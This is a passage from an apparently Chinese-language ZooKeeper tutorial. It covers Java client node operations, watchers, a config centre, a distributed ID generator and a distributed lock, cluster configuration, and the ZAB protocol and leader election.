路径\n                * @param ctx 上下文参数\n                * @param name 路径\n                */\n               public void processResult(int rc, String path, Object ctx, String name){\n                   System.out.println(rc + " " + path + " " + name +  " " + ctx);\n               }\n           }, "I am context");\n           TimeUnit.SECONDS.sleep(1);\n           System.out.println("结束");\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   \n\n# 修改节点\n\n同样也有两种修改方式(异步和同步)\n\n * // 同步\n   setData(String path, byte[] data, int version)\n   // 异步\n   setData(String path, byte[] data, int version, StatCallback callBack, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   \n * \n\n * 参数         解释\n   path       节点路径\n   data       数据\n   version    数据的版本号， -1代表不使用版本号，乐观锁机制\n   callBack   异步回调 AsyncCallback.StatCallback，和之前的回调方法参数不同，这个可以获取节点状态\n   ctx        传递上下文参数\n\n *     public static void setData1() throws Exception{\n       \t// arg1:节点的路径\n           // arg2:修改的数据\n           // arg3:数据的版本号 -1 代表版本号不参与更新\n           Stat stat = zookeeper.setData("/hadoop","hadoop-1".getBytes(),-1);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n *     public static void setData2() throws Exception{\n           zookeeper.setData("/hadoop", "hadoop-1".getBytes(), 3 ,new AsyncCallback.StatCallback(){\n               @Override\n               public void processResult(int rc, String path, Object ctx, Stat stat) {\n                   // 讲道理，要判空\n                   System.out.println(rc + " " + path + " " + stat.getVersion() +  " " + ctx);\n               }\n           }, "I am context");\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   \n\n# 删除节点\n\n异步、同步\n\n * // 同步\n   delete(String path, int version)\n   // 异步\n   delete(String path, int version, AsyncCallback.VoidCallback callBack, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   \n * \n\n * 参数         解释\n   path       节点路径\n   version    版本\n   callBack   数据的版本号， -1代表不使用版本号，乐观锁机制\n   ctx        传递上下文参数\n\n *     public static void deleteData1() throws Exception {\n           zookeeper.delete("/hadoop", 1);\n       }\n   \n       public static void deleteData2() throws Exception {\n           zookeeper.delete("/hadoop", 1, new AsyncCallback.VoidCallback() {\n               @Override\n               public void processResult(int rc, String path, Object ctx) {\n                   System.out.println(rc + " " + path + " " + ctx);\n               }\n           }, "I am context");\n           TimeUnit.SECONDS.sleep(1);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   \n\n# 查看节点\n\n同步、异步\n\n * // 同步\n   getData(String path, boolean watch, Stat stat)\n   getData(String path, Watcher watcher, Stat stat)\n   // 异步\n   getData(String path, boolean watch, DataCallback callBack, Object ctx)\n   getData(String path, Watcher watcher, DataCallback callBack, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    是否使用连接对象中注册的监听器\n   stat       元数据\n   callBack   异步回调接口，可以获得状态和数据\n   ctx        传递上下文参数\n\n *     public static void getData1() throws Exception {\n           Stat stat = new Stat();\n           byte[] data = zookeeper.getData("/hadoop", false, stat);\n           System.out.println(new String(data));\n           // 判空\n           System.out.println(stat.getCtime());\n       }\n   \n       public static void getData2() throws Exception {\n           zookeeper.getData("/hadoop", false, new AsyncCallback.DataCallback() {\n               @Override\n               public void processResult(int rc, String path, Object ctx, byte[] bytes, Stat stat) {\n                   // 判空\n                   System.out.println(rc + " " + path\n                                      + " " + ctx + " " + new String(bytes) + " " + \n                                      stat.getCzxid());\n               }\n           }, "I am context");\n           TimeUnit.SECONDS.sleep(3);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n# 查看子节点\n\n同步、异步\n\n * // 同步\n   getChildren(String path, boolean watch)\n   getChildren(String path, Watcher watcher)\n   getChildren(String path, boolean watch, Stat stat)    \n   getChildren(String path, Watcher watcher, Stat stat)\n   // 异步\n   getChildren(String path, boolean watch, ChildrenCallback callBack, Object ctx)    \n   getChildren(String path, Watcher watcher, ChildrenCallback callBack, Object ctx)\n   getChildren(String path, Watcher watcher, Children2Callback callBack, Object ctx)    \n   getChildren(String path, boolean watch, Children2Callback callBack, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    \n   callBack   异步回调，可以获取节点列表\n   ctx        传递上下文参数\n\n *     public static void getChildren_1() throws Exception{\n           List<String> hadoop = zookeeper.getChildren("/hadoop", false);\n           hadoop.forEach(System.out::println);\n       }\n   \n       public static void getChildren_2() throws Exception {\n           zookeeper.getChildren("/hadoop", false, new AsyncCallback.ChildrenCallback() {\n               @Override\n               public void processResult(int rc, String path, Object ctx, List<String> list) {\n                   list.forEach(System.out::println);\n                   System.out.println(rc + " " + path + " " + ctx);\n               }\n           }, "I am children");\n           TimeUnit.SECONDS.sleep(3);\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n# 检查节点是否存在\n\n同步、异步\n\n * // 同步\n   exists(String path, boolean watch)\n   exists(String path, Watcher watcher)\n   // 异步\n   exists(String path, boolean watch, StatCallback cb, Object ctx)\n   exists(String path, Watcher watcher, StatCallback cb, Object ctx)\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n * \n\n * 参数         解释\n   path       节点路径\n   boolean    \n   callBack   异步回调，可以获取节点列表\n   ctx        传递上下文参数\n\n * public static void exists1() throws Exception{\n       Stat exists = zookeeper.exists("/hadoopx", false);\n       // 判空\n       System.out.println(exists.getVersion() + "成功");\n   }\n   public static void exists2() throws Exception{\n       zookeeper.exists("/hadoopx", false, new AsyncCallback.StatCallback() {\n           @Override\n           public void processResult(int rc, String path, Object ctx, Stat stat) {\n               // 判空\n               System.out.println(rc + " " + path + " " + ctx +" " + stat.getVersion());\n           }\n       }, "I am children");\n       TimeUnit.SECONDS.sleep(1);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   \n\n\n# 事件监听机制\n\nwatcher概念\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperProgrammers.html#sc_WatchRememberThese\n\n * zookeeper提供了数据的发布/订阅功能，多个订阅者可同时监听某一特定主题对象，当该主题对象的自身状态发生变化时例如节点内容改变、节点下的子节点列表改变等，会实时、主动通知所有订阅者\n * zookeeper采用了 Watcher机制实现数据的发布订阅功能。该机制在被订阅对象发生变化时会异步通知客户端，因此客户端不必在 Watcher注册后轮询阻塞，从而减轻了客户端压力\n * watcher机制事件上与观察者模式类似，也可看作是一种观察者模式在分布式场景下的实现方式\n\n# watcher架构\n\nwatcher实现由三个部分组成\n\n * zookeeper服务端\n * zookeeper客户端\n * 客户端的ZKWatchManager对象\n\n客户端首先将 Watcher注册到服务端，同时将 Watcher对象保存到客户端的watch管理器中。当Zookeeper服务端监听的数据状态发生变化时，服务端会主动通知客户端，接着客户端的 Watch管理器会**触发相关 Watcher**来回调相应处理逻辑，从而完成整体的数据 发布/订阅流程\n\n\n\n# watcher特性\n\n * \n\n * 特性        说明\n   一次性       watcher是一次性的，一旦被触发就会移除，再次使用时需要重新注册\n   客户端顺序回调   watcher回调是顺序串行执行的，只有回调后客户端才能看到最新的数据状态。一个watcher回调逻辑不应该太多，以免影响别的watcher执行\n   轻量级       WatchEvent是最小的通信单位，结构上只包含通知状态、事件类型和节点路径，并不会告诉数据节点变化前后的具体内容\n   时效性       watcher只有在当前session彻底失效时才会无效，若在session有效期内快速重连成功，则watcher依然存在，仍可接收到通知；\n\nwatcher接口设计\n\nWatcher是一个接口，任何实现了Watcher接口的类就算一个新的Watcher。Watcher内部包含了两个枚举类：KeeperState、EventType\n\n\n\n# Watcher通知状态(KeeperState)\n\nKeeperState是客户端与服务端连接状态发生变化时对应的通知类型。路径为org.apache.zookeeper.Watcher.EventKeeperState，是一个枚举类，其枚举属性如下：\n\n * \n\n * 枚举属性            说明\n   SyncConnected   客户端与服务器正常连接时\n   Disconnected    客户端与服务器断开连接时\n   Expired         会话session失效时\n   AuthFailed      身份认证失败时\n\n# Watcher事件类型(EventType)\n\nEventType是数据节点znode发生变化时对应的通知类型。EventType变化时KeeperState永远处于SyncConnected通知状态下；当keeperState发生变化时，EventType永远为None。其路径为org.apache.zookeeper.Watcher.Event.EventType，是一个枚举类，枚举属性如下：\n\n * \n\n * 枚举属性                  说明\n   None                  无\n   NodeCreated           Watcher监听的数据节点被创建时\n   NodeDeleted           Watcher监听的数据节点被删除时\n   NodeDataChanged       Watcher监听的数据节点内容发生更改时(无论数据是否真的变化)\n   NodeChildrenChanged   Watcher监听的数据节点的子节点列表发生变更时\n\n * 注意：客户端接收到的相关事件通知中只包含状态以及类型等信息，不包含节点变化前后的具体内容，变化前的数据需业务自身存储，变化后的数据需要调用get等方法重新获取\n\n# 捕获相应的事件\n\n上面讲到zookeeper客户端连接的状态和zookeeper对znode节点监听的事件类型，下面我们来讲解如何建立zookeeper的***watcher监听***。在zookeeper中采用zk.getChildren(path,watch)、zk.exists(path,watch)、zk.getData(path,watcher,stat)这样的方式来为某个znode注册监听 。\n\n下表以node-x节点为例，说明调用的注册方法和可用监听事件间的关系：\n\n注册方式                                CREATED   CHILDRENCHANGED   CHANGED   DELETED\nzk.exists("/node-x",watcher)        可监控                         可监控       可监控\nzk.getData("/node-x",watcher)                                   可监控       可监控\nzk.getChildren("/node-x",watcher)             可监控                         可监控\n\n注册watcher的方法\n\n# 客户端与服务器端的连接状态\n\n * KeeperState：通知状态\n\n * SyncConnected：客户端与服务器正常连接时\n\n * Disconnected：客户端与服务器断开连接时\n\n * Expired：会话session失效时\n\n * AuthFailed：身份认证失败时\n\n * 事件类型为：None\n   \n   * 案例\n   \n   * public class ZkConnectionWatcher implements Watcher {\n         @Override\n         public void process(WatchedEvent watchedEvent) {\n             Event.KeeperState state = watchedEvent.getState();\n             if(state == Event.KeeperState.SyncConnected){\n                 // 正常\n                 System.out.println("正常连接");\n             }else if (state == Event.KeeperState.Disconnected){\n                 // 可以用Windows断开虚拟机网卡的方式模拟\n                 // 当会话断开会出现，断开连接不代表不能重连，在会话超时时间内重连可以恢复正常\n                 System.out.println("断开连接");\n             }else if (state == Event.KeeperState.Expired){\n                 // 没有在会话超时时间内重新连接，而是当会话超时被移除的时候重连会走进这里\n                 System.out.println("连接过期");\n             }else if (state == Event.KeeperState.AuthFailed){\n                 // 在操作的时候权限不够会出现\n                 System.out.println("授权失败");\n             }\n             countDownLatch.countDown();\n         }\n         private static final String IP = "192.168.133.133:2181"\n     ;\n         private static CountDownLatch countDownLatch = new CountDownLatch(1);\n     \n         public static void main(String[] args) throws Exception {\n             // 5000为会话超时时间\n             ZooKeeper zooKeeper = new ZooKeeper(IP, 5000, new ZkConnectionWatcher());\n             countDownLatch.await();\n             // 模拟授权失败\n             zooKeeper.addAuthInfo("digest1","itcast1:123451".getBytes());\n             byte[] data = zooKeeper.getData("/hadoop", false, null);\n             System.out.println(new String(data));\n             TimeUnit.SECONDS.sleep(50);\n         }\n     }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     \n\n# watcher检查节点\n\nexists\n\n * exists(String path, boolean b)\n\n * exists(String path, Watcher w)\n\n * NodeCreated：节点创建\n\n * NodeDeleted：节点删除\n\n * NodeDataChanged：节点内容\n   \n   * 案例\n   \n   * public class EventTypeTest {\n         private static final String IP = "192.168.133.133:2181";\n         private static CountDownLatch countDownLatch = new CountDownLatch(1);\n         private static ZooKeeper zooKeeper;\n     \n         // 采用zookeeper连接创建时的监听器\n         public static void exists1() throws Exception{\n             zooKeeper.exists("/watcher1",true);\n         }\n         // 自定义监听器\n         public static void exists2() throws Exception{\n             zooKeeper.exists("/watcher1",(WatchedEvent w) -> {\n                 System.out.println("自定义" + w.getType());\n             });\n         }\n         // 演示使用多次的监听器\n         public static void exists3() throws Exception{\n             zooKeeper.exists("/watcher1", new Watcher() {\n                 @Override\n                 public void process(WatchedEvent watchedEvent) {\n                     try {\n                         System.out.println("自定义的" + watchedEvent.getType());\n                     } finally {\n                         try {\n                             zooKeeper.exists("/watcher1",this);\n                         } catch (Exception e) {\n                             e.printStackTrace();\n                         }\n                     }\n                 }\n             });\n         }\n         // 演示一节点注册多个监听器\n         public static void exists4() throws Exception{\n             zooKeeper.exists("/watcher1",(WatchedEvent w) -> {\n                 System.out.println("自定义1" + w.getType());\n             });\n             zooKeeper.exists("/watcher1", new Watcher() {\n                 @Override\n                 public void process(WatchedEvent watchedEvent) {\n                     try {\n                         System.out.println("自定义2" + watchedEvent.getType());\n                     } finally {\n                         try {\n                             zooKeeper.exists("/watcher1",this);\n                         } catch (Exception e) {\n                             e.printStackTrace();\n                         }\n                     }\n                 }\n             });\n         }\n         // 测试\n         public static void main(String[] args) throws Exception {\n             zooKeeper = new ZooKeeper(IP, 5000, new ZKWatcher());\n             countDownLatch.await();\n             exists4();\n             TimeUnit.SECONDS.sleep(50);\n         }\n     \n         static class ZKWatcher implements Watcher{\n             @Override\n             public void process(WatchedEvent watchedEvent) {\n                 countDownLatch.countDown();\n                 System.out.println("zk的监听器" + watchedEvent.getType());\n             }\n         }\n     \n     }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     37\n     38\n     39\n     40\n     41\n     42\n     43\n     44\n     45\n     46\n     47\n     48\n     49\n     50\n     51\n     52\n     53\n     54\n     55\n     56\n     57\n     58\n     59\n     60\n     61\n     62\n     63\n     64\n     65\n     66\n     67\n     68\n     69\n     \n\ngetData\n\n * getData(String path, boolean b, Stat stat)\n * getData(String path, Watcher w, Stat stat)\n * NodeDeleted：节点删除\n * NodeDataChange：节点内容发生变化\n\ngetChildren\n\n * getChildren(String path, boolean b)\n * getChildren(String path, Watcher w)\n * NodeChildrenChanged：子节点发生变化\n * NodeDeleted：节点删除\n\n\n# 配置中心案例\n\n工作中有这样的一个场景：数据库用户名和密码信息放在一个配置文件中，应用读取该配置文件，配置文件信息放入缓存\n\n若数据库的用户名和密码改变时候，还需要重新加载媛存，比较麻烦，通过 Zookeeper可以轻松完成,当数据库发生变化时自动完成缓存同步\n\n使用事件监听机制可以做出一个简单的配置中心\n\n设计思路\n\n 1. 连接zookeeper服务器\n 2. 读取zookeeper中的配置信息，注册watcher监听器，存入本地变量\n 3. 当zookeeper中的配置信息发生变化时，通过watcher的回调方法捕获数据变化事件\n 4. 重新获取配置信息\n\n\n# 分布式唯一id案例\n\n在过去的单库单表型系统中，通常第可以使用数据库字段自带的auto_ increment属性来自动为每条记录生成个唯一的ID。但是分库分表后，就无法在依靠数据库的auto_ increment属性来唯一标识一条记录了。此时我们就可以用zookeeper在分布式环境下生成全局唯一ID\n\npublic class IdGenerate {\n\n    private static final String IP = "192.168.133.133:2181";\n    private static CountDownLatch countDownLatch = new CountDownLatch(1);\n    private static ZooKeeper zooKeeper;\n\n    public static String generateId() throws Exception {\n        return zooKeeper.create("/id", new byte[0], ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);\n    }\n\n\n    public static void main(String[] args) throws Exception {\n        zooKeeper = new ZooKeeper(IP, 5000, new ZKWatcher());\n        countDownLatch.await();\n        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(5, 5, 0, TimeUnit.SECONDS, new ArrayBlockingQueue<>(10));\n        for (int i = 0; i < 10; i++) {\n            threadPoolExecutor.execute(() -> {\n                try {\n                    System.out.println(generateId());\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n        }\n        TimeUnit.SECONDS.sleep(50);\n        threadPoolExecutor.shutdown();\n    }\n\n    static class ZKWatcher implements Watcher {\n        @Override\n        public void process(WatchedEvent watchedEvent) {\n            countDownLatch.countDown();\n            System.out.println("zk的监听器" + watchedEvent.getType());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 分布式锁案例\n\n分布式锁有多种实现方式，比如通过数据库、redis都可实现。作为分布式协同工具Zookeeper，当然也有着标准的实现方式。下面介绍在zookeeper中如果实现排他锁\n\n设计思路\n\n 1. 每个客户端往/Locks下创建临时有序节点/Locks/Lock_，创建成功后/Locks下面会有每个客户端对应的节点，如/Locks/Lock_000000001\n 2. 客户端取得/Locks下子节点，并进行排序，判断排在前面的是否为自己，如果自己的锁节点在第一位，代表获取锁成功\n 3. 如果自己的锁节点不在第一位，则监听自己前一位的锁节点。例如，自己锁节点Lock_000000002，那么则监听Lock_000000001\n 4. 当前一位锁节点(Lock_000000001)对应的客户端执行完成，释放了锁，将会触发监听客户端(Lock_000000002)的逻辑\n 5. 监听客户端重新执行第2步逻辑，判断自己是否获得了锁\n 6. zookeeper是有工具包的(这里采用手写)\n\n// 线程测试类\npublic class ThreadTest {\n    public static void delayOperation(){\n        try {\n            TimeUnit.SECONDS.sleep(5);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n    static interface Runable{\n        void run();\n    }\n    public static void run(Runable runable,int threadNum){\n        ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(30, 30,\n                0, TimeUnit.SECONDS, new ArrayBlockingQueue<>(10));\n        for (int i = 0; i < threadNum; i++) {\n            threadPoolExecutor.execute(runable::run);\n        }\n        threadPoolExecutor.shutdown();\n    }\n\n    public static void main(String[] args) {\n//        DistributedLock distributedLock = new DistributedLock();\n//        distributedLock.acquireLock();\n//        delayOperation();\n//        distributedLock.releaseLock();\n        DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");\n        // 每秒打印信息\n        run(() -> {\n            for (int i = 0; i < 999999999; i++) {\n                try {\n                    TimeUnit.SECONDS.sleep(1);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                String format = dateTimeFormatter.format(LocalDateTime.now());\n                System.out.println(format);\n            }\n        },1);\n        // 线程测试\n        run(() -> {\n            DistributedLock distributedLock = new DistributedLock();\n            distributedLock.acquireLock();\n            delayOperation();\n            distributedLock.releaseLock();\n        },30);\n    }\n}\npublic class DistributedLock {\n    private String IP = "192.168.133.133:2181";\n    private final String ROOT_LOCK = "/Root_Lock";\n    private final String LOCK_PREFIX = "/Lock_";\n    private final CountDownLatch countDownLatch = new CountDownLatch(1);\n    private final byte[] DATA = new byte[0];\n\n    private ZooKeeper zookeeper;\n    private String path;\n\n    private void init(){\n        // 初始化\n        try {\n            zookeeper = new ZooKeeper(IP, 200000, w -> {\n                if(w.getState() == Watcher.Event.KeeperState.SyncConnected){\n                    System.out.println("连接成功");\n                }\n                countDownLatch.countDown();\n            });\n            countDownLatch.await();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // 暴露的外部方法，主逻辑\n    public void acquireLock(){\n        init();\n        createLock();\n        attemptLock();\n    }\n\n    // 暴露的外部方法，主逻辑\n    public void releaseLock(){\n        try {\n            zookeeper.delete(path,-1);\n            System.out.println("锁释放了" + path);\n        } catch (InterruptedException | KeeperException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void createLock(){\n        try {\n            // 创建一个目录节点\n            Stat root = zookeeper.exists(ROOT_LOCK, false);\n            if(root == null)\n                zookeeper.create(ROOT_LOCK, DATA, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);\n            // 目录下创建子节点\n            path = zookeeper.create(ROOT_LOCK + LOCK_PREFIX, DATA, ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL_SEQUENTIAL);\n        } catch (KeeperException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n    private Watcher watcher = new Watcher() {\n        @Override\n        public void process(WatchedEvent watchedEvent) {\n            if (watchedEvent.getType() == Event.EventType.NodeDeleted){\n                synchronized (this){\n                    this.notifyAll();\n                }\n            }\n        }\n    };\n\n    private void attemptLock(){\n        try {\n            // 获取正在排队的节点，由于是zookeeper生成的临时节点，不会出错，这里不能加监视器\n            // 因为添加了监视器后，任何子节点的变化都会触发监视器\n            List<String> nodes = zookeeper.getChildren(ROOT_LOCK,false);\n            nodes.sort(String::compareTo);\n            // 获取自身节点的排名\n            int ranking = nodes.indexOf(path.substring(ROOT_LOCK.length() + 1));\n            // 已经是最靠前的节点了，获取锁\n            if(ranking == 0){\n                return;\n            }else {\n                // 并不是靠前的锁，监视自身节点的前一个节点\n                Stat status = zookeeper.exists(ROOT_LOCK+"/"+nodes.get(ranking - 1), watcher);\n                // 有可能这这个判断的瞬间，0号完成了操作(此时我们应该判断成功自旋才对)，但是上面的status变量已经获取了值并且不为空，1号沉睡\n                // 但是，请注意自行测试，虽然1号表面上沉睡了，但是实际上watcher.wait()是瞬间唤醒的\n                if(status == null){\n                    attemptLock();\n                }else {\n                    synchronized (watcher){\n                        watcher.wait();\n                    }\n                    attemptLock();\n                }\n            }\n        } catch (KeeperException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n\n\n\n# 集群搭建\n\nzookeeper官网——Getting started——https://zookeeper.apache.org/doc/r3.4.14/zookeeperStarted.html#sc_RunningReplicatedZooKeeper\n\n完全配置——https://zookeeper.apache.org/doc/r3.4.14/zookeeperAdmin.html#sc_zkMulitServerSetup https://zookeeper.apache.org/doc/r3.4.14/zookeeperAdmin.html#sc_configuration\n\n运行时复制的zookeeper\n\n说明：对于复制模式，至少需要三个服务器，并且强烈建议您使用奇数个服务器。如果只有两台服务器，那么您将处于一种情况，如果其中一台服务器发生故障，则没有足够的计算机构成多数仲裁(zk采用的是过半数仲裁。因此，搭建的集群要容忍n个节点的故障，就必须有2n+1台计算机，这是因为宕掉n台后，集群还残余n+1台计算机，n+1台计算机中必定有一个最完整最接近leader的follower，假如宕掉的n台都是有完整信息的，剩下的一台就会出现在残余的zk集群中。也就是说：zk为了安全，必须达到多数仲裁，否则没有leader，集群失败，具体体现在**leader选举-章**)。由于存在两个单点故障，因此两个服务器还不如单个服务器稳定。\n\n——关于2n+1原则，Kafka官网有权威的解释(虽然Kafka不采用)http://kafka.apache.org/0110/documentation.html#design_replicatedlog\n\n多数仲裁的设计是为了避免脑裂(zk，已经采用了多数仲裁，所以不会出现)，和数据一致性的问题\n\n * 脑裂：由于网络延迟等各种因素，最终导致集群一分为二，各自独立运行(两个leader)，集群就是坏的\n * 如果有两台服务器，两台都认为另外的zk宕掉，各自成为leader运行(假设可以，实际上选不出leader，可以实际搭建一个集群，看看一台zk是否能够成功集群，详见**leader选举**)，就会导致数据不一致。\n * 如果有三台服务器，一台因为网络分区，无法连接，剩下两台网络正常，选举出了leader，集群正常\n * 以此类推\n   * \n   * zk的设计天生就是cap中的cp，所以不会出现上述的脑裂和数据一致性问题，我们搭建zk仅需保证2n+1原则\n\n复制模式所需的conf / zoo.cfg文件类似于独立模式下使用的文件，但有一些区别。这是一个例子：\n\ntickTime=2000\ndataDir=/var/lib/zookeeper\nclientPort=2181\ninitLimit=5\nsyncLimit=2\nserver.1=zoo1:2888:3888 # 这是多机部署\nserver.2=zoo2:2888:3888\nserver.3=zoo3:2888:3888\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 新的键值**initLimit是zookeeper用于限制选举中zookeeper服务连接到leader的时间，syncLimit**限制服务器与leader的过期时间\n * 对于这两个超时，您都可以使用tickTime指定时间单位。在此示例中，initLimit的超时为5个滴答声，即2000毫秒/滴答声，即10秒\n * 表格*server.X的条目列出了组成ZooKeeper服务的服务器。服务器启动时，它通过在数据目录中查找文件myid*来知道它是哪台服务器。该文件包含ASCII的服务器号。\n * 最后，记下每个服务器名称后面的两个端口号：“ 2888”和“ 3888”。对等方使用前一个端口连接到其他对等方。这种连接是必需的，以便对等方可以进行通信，例如，以商定更新顺序。更具体地说，ZooKeeper服务器使用此端口将follower连接到leader。当出现新的leader者时，follower使用此端口打开与leader的TCP连接。因为默认的leader选举也使用TCP，所以我们当前需要另一个端口来进行leader选举。这是第二个端口。\n\n正文搭建：单机环境下，jdk、zookeeper安装完毕，基于一台虚拟机，进行zookeeper伪集群搭建，zookeeper集群中包含3个节点，节点对外提供服务端口号，分别为2181、2182、2183\n\n 1. 基于zookeeper-3.4.10复制三份zookeeper安装好的服务器文件,目录名称分别为zookeeper2181、zookeeper2182、zookeeper2183\n    \n    cp -r zookeeper-3.4.10  zookeeper2181\n    cp -r zookeeper-3.4.10  zookeeper2182\n    cp -r zookeeper-3.4.10  zookeeper2183\n    \n    # cp -r zookeeper-3.1.10 ./zookeeper218{1..3}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 修改zookeeper2181服务器对应配置文件\n\n# 服务器对应端口号\nclientPort=2181\n# 数据快照文件所在路径\ndataDir=/opt/zookeeper2181/data\n# 集群配置信息\n   # server:A=B:C:D\n   # A:是一个数字，表示这个是服务器的编号\n   # B:是这个服务器的ip地址\n   # C:Zookeeper服务器之间通信的端口(数据互通，必须的)\n   # D:Leader选举的端口\nserver.1=192.168.133.133:2287:3387  # 这是伪集群部署，注意端口号  \nserver.2=192.168.133.133:2288:3388\nserver.3=192.168.133.133:2289:3389\n# 对，这些都是2181的配置文件\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n 3. 在上一步 dataDir指定的目录下，创建myid文件，然后在该文件添加上一步server配置的对应A数字\n    \n    # zookeeper2181对应的数字为1\n    # /opt/zookeeper2181/data目录(即dataDir的目录下)下执行命令\n    echo "1" > myid\n    \n    \n    1\n    2\n    3\n    \n\n 4. zookeeper2182、2183参照2/3进行相应配置\n\n 5. 分别启动三台服务器，检验集群状态\n    \n    检查：cd进入bin目录./zkServer status\n    \n    登录命令：\n    \n    ./zkCli.sh -server 192.168.60.130:2181\n    ./zkCli.sh -server 192.168.60.130:2182\n    ./zkCli.sh -server 192.168.60.130:2183\n    # 如果启动后没有显示出集群的状态，请自己检查端口和配置文件问题，主要是端口占用和配置文件问题\n    # ss -lntpd | grep 2181\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n# 一致性协议——zab协议\n\nzab协议的全称是 Zookeeper Atomic Broadcast (zookeeper原子广播)。zookeeper是通过zab协议来保证分布式事务的最终一致性\n\n基于zab协议，zookeeper集群中的角色主要有以下三类，如下所示：\n\n角色                           描述\n领导者(Leader)                  领导者负责进行投票的发起和决议，更新系统状态\n学习者(Learner)-跟随者(Follower)   Follower用于接收客户端请求并向客户端返回结果，在选主过程中参与投票\n学习者(Learner)-观察者(ObServer)   ObServer可以接收客户端连接，将写请求转发给leader节点。但ObServer不参加投票过程，只同步leader的状态。ObServer的目的是为了扩展系统，提高读取速度\n客户端(Client)                  请求发起方\n\n·zab广播模式工作原理，通过类似两端式提交协议的方式解决数据一致性：\n\n\n\n 1. leader从客户端收到一个写请求\n 2. leader生成一个新的事务并为这个事务生成一个唯一的ZXID\n 3. leader将事务提议(propose)发送给所有的follows节点\n 4. follower节点将收到的事务请求加入到本地历史队列(history queue)中，并发送ack给leader，表示确认提议\n 5. 当leader收到大多数follower(半数以上节点)的ack(acknowledgement)确认消息，leader会本地提交，并发送commit请求\n 6. 当follower收到commit请求时，从历史队列中将事务请求commit\n\n因为是半数以上的结点就可以通过事务请求，所以延迟不高\n\n# leader选举\n\n服务器状态\n\n * looking：寻找leader状态。当服务器处于该状态时，它会认为当前集群中没有leader，因此需要进入leader选举状态\n * following：跟随着状态。表明当前服务器角色是follower\n * observing：观察者状态。表明当前服务器角色是observer\n\n分为两种选举，服务器启动时的选举和服务器运行时期的选举\n\n服务器启动时期的leader选举\n\n在集群初始化节点，当有一台服务器server1启动时，其单独无法进行和完成leader选举，当第二台服务器server2启动时，此时两台及其可以相互通信，每台及其都试图找到leader，于是进入leader选举过程。选举过程如下：\n\n 1. 每个server发出一个投票。由于是初始状态，server1和server2都会将自己作为leader服务器来进行投票，每次投票都会包含所推举的myid和zxid，使用(myid，zxid)，此时server1的投票为(1，0)，server2的投票为(2，0)，然后各自将这个投票发给集群中的其它机器\n\n 